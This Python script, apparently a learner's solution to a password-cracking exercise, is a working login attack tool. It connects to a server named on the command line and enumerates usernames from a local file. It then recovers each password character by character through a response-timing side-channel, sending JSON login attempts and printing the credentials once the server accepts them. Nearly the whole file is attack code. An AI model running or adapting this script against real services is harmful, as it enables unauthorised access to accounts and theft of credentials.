# write your code here
import sys
import socket
import itertools
import json
from datetime import datetime
def letters(word):
    if len(word) == 1:
        return [word.lower(), word.upper()]

    return [f"{j}{i}" for j in letters(word[0]) for i in letters(word[1:])]
a_z = [chr(x) for x in range(ord('a'), ord('z') + 1)]
A_Z = [chr(x).upper() for x in range(ord('a'), ord('z') + 1)]
zero_nine = [str(i) for i in range(0,10)]
#alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
#letters = {"a-z": "abcdefghijklmnopqrstuvwxyz", "A-Z": "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "0-9": "0123456789"}
#password = open('/Users/arjunlohan/Downloads/passwords.txt', 'r')
login = open("/Users/arjunlohan/Downloads/logins.txt", 'r')
args_list = sys.argv
IP = str(args_list[1])
port = int(args_list[2])
break_while_loop = ""
with socket.socket() as hack_socket:
    address = (IP,port)
    hack_socket.connect(address)
    response = 0
    lenght = 1
    password_list = a_z + zero_nine + A_Z + a_z
    password_empty = " "
    response_time = []
    for i in login:
        message = {"login": i.strip(), "password": password_empty}
        message = json.dumps(message)
        #print(message)
        hack_socket.send(message.encode())
        response = hack_socket.recv(1024)
        #response = response.decode()
        response_json = json.loads(response)
        #print(response_json)
        if str(response_json) == "{'result': 'Wrong password!'}":
            z = 0
            password = ""
            while break_while_loop != "Connection success!":
                #print(z)
                password_input = password + password_list[z]
                #print(password_input)
                message = {"login": i.strip(), "password": password_input}
                #print(password_list[z])
                message = json.dumps(message, indent=1)
                start = datetime.now()
                hack_socket.send(message.encode())
                response = hack_socket.recv(1024)
                finish = datetime.now()
                difference = finish - start
                response_time.append(difference)
                # response = response.decode()
                response_json = json.loads(response)
                #print(response_json)
                result = str(response_json)
                #print(result)
                #print(difference)
                if result == "{'result': 'Wrong password!'}":
                    if int(str(difference)[-6::]) > 6000:
                        password += password_list[z]
                        z = 0
                    else:
                        z += 1
                elif result == "{'result': 'Connection success!'}":
                    print(message)
                    #print(password_input)
                    break_while_loop = "Connection success!"
                else:
                    pass
        if break_while_loop == "Connection success!":
            break
